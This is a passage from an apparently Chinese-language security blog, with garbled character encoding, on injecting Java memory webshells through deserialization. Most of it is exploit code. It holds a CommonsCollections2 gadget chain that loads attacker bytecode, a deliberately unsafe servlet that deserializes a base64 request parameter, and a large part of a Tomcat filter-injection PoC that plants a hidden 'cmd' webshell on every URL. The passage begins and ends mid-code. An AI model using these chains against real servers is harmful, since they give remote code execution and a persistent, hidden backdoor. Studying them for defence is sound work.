Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ— TransformChainçš„cc2æ‰“å…¥å­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> memoryshell.UnserShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransforme</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Sentiment&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class c=transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">In</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> In.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;FilterShell.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Servletç«¯åªéœ€è¦ä¸€ä¸ªæ¥æ”¶å‚æ•°base64è§£ç å¹¶ååºåˆ—åŒ–çš„æ¥å£ï¼Œæ²¡æœ‰base64è§£ç çš„æ¥å£å¯ä»¥ç”¨curl â€“data-binaryæ³¨å…¥äºŒè¿›åˆ¶æ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> memoryshell.UnserShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><p>è®°å¾—æ–‡ä»¶-&gt;é¡¹ç›®ç»“æ„-&gt;å·¥ä»¶é‡Œé¢å°†ä¾èµ–åº“å¯¼å…¥WEB-INF&#x2F;lib</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154251902.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154251902.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154418676.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154418676.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="cc11"><a href="#cc11" class="headerlink" title="cc11"></a>cc11</h3><p>å¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…åˆ©ç”¨cc11æ³¨å…¥çš„æ–‡ç« <a href="http://wjlshare.com/archives/1541%E9%87%8C%EF%BC%8C%E8%AF%A5POC%E5%AE%9E%E7%8E%B0%E4%BA%86spring%E7%8E%AF%E5%A2%83%E7%9A%84reqeust%E8%8E%B7%E5%8F%96">http://wjlshare.com/archives/1541é‡Œï¼Œè¯¥POCå®ç°äº†springç¯å¢ƒçš„reqeustè·å–</a></p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleState;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatInject</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * webshellå‘½ä»¤å‚æ•°å</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span> <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterUrlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;KpLi0rn&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">            <span class="keyword">if</span> (servletContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">ctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                ctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) ctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(appctx);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (standardContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="comment">// è¿™æ ·è®¾ç½®ä¸ä¼šæŠ›å‡ºæŠ¥é”™</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class</span><br><span class="line">                            .getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                    stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    stateField.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Filter</span> <span class="variable">myFilter</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TomcatInject</span>();</span><br><span class="line">                    <span class="comment">// è°ƒç”¨ doFilter æ¥åŠ¨æ€æ·»åŠ æˆ‘ä»¬çš„ Filter</span></span><br><span class="line">                    <span class="comment">// è¿™é‡Œä¹Ÿå¯ä»¥åˆ©ç”¨åå°„æ¥æ·»åŠ æˆ‘ä»¬çš„ Filter</span></span><br><span class="line">                    javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span></span><br><span class="line">                            servletContext.addFilter(filterName,myFilter);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// è¿›è¡Œä¸€äº›ç®€å•çš„è®¾ç½®</span></span><br><span class="line">                    filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                    filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line">                    <span class="comment">// è®¾ç½®åŸºæœ¬çš„ url pattern</span></span><br><span class="line">                    filterRegistration</span><br><span class="line">                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// å°†æœåŠ¡é‡æ–°ä¿®æ”¹å›æ¥ï¼Œä¸ç„¶çš„è¯æœåŠ¡ä¼šæ— æ³•æ­£å¸¸è¿›è¡Œ</span></span><br><span class="line">                    <span class="keyword">if</span> (stateField != <span class="literal">null</span>)&#123;</span><br><span class="line">                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// åœ¨è®¾ç½®ä¹‹åæˆ‘ä»¬éœ€è¦ è°ƒç”¨ filterstart</span></span><br><span class="line">                    <span class="keyword">if</span> (standardContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="comment">// è®¾ç½®filterä¹‹åè°ƒç”¨ filterstart æ¥å¯åŠ¨æˆ‘ä»¬çš„ filter</span></span><br><span class="line">                        <span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> StandardContext.class.getDeclaredMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                        filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        filterStartMethod.invoke(standardContext,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/**</span></span><br><span class="line"><span class="comment">                         * å°†æˆ‘ä»¬çš„ filtermap æ’å…¥åˆ°æœ€å‰é¢</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"></span><br><span class="line">                        <span class="type">Class</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ccc = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        <span class="keyword">if</span> (ccc == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ccc = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//æŠŠfilteræ’åˆ°ç¬¬ä¸€ä½</span></span><br><span class="line">                        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>)</span><br><span class="line">                                .getDeclaredMethod(<span class="string">&quot;findFilterMaps&quot;</span>);</span><br><span class="line">                        Object[] filterMaps = (Object[]) m.invoke(standardContext);</span><br><span class="line">                        Object[] tmpFilterMaps = <span class="keyword">new</span> <span class="title class_">Object</span>[filterMaps.length];</span><br><span class="line">                        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                            m = ccc.getMethod(<span class="string">&quot;getFilterName&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) m.invoke(o);</span><br><span class="line">                            <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                                tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ServletContext <span class="title function_">getServletContext</span><span class="params">()</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">/*shellæ³¨å…¥ï¼Œå‰æéœ€è¦èƒ½æ‹¿åˆ°requestã€responseç­‰*/</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) f.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//ä¸ä¸ºç©ºåˆ™æ„å‘³ç€ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„å‡†å¤‡å·¥ä½œå·²æˆåŠŸ</span></span><br><span class="line">        <span class="keyword">if</span> (threadLocal != <span class="literal">null</span> &amp;&amp; threadLocal.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">            servletRequest = (ServletRequest) threadLocal.get();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å¦‚æœä¸èƒ½å»åˆ°requestï¼Œåˆ™æ¢ä¸€ç§æ–¹å¼å°è¯•è·å–</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//springè·å–æ³•1</span></span><br><span class="line">        <span class="keyword">if</span> (servletRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">                c = 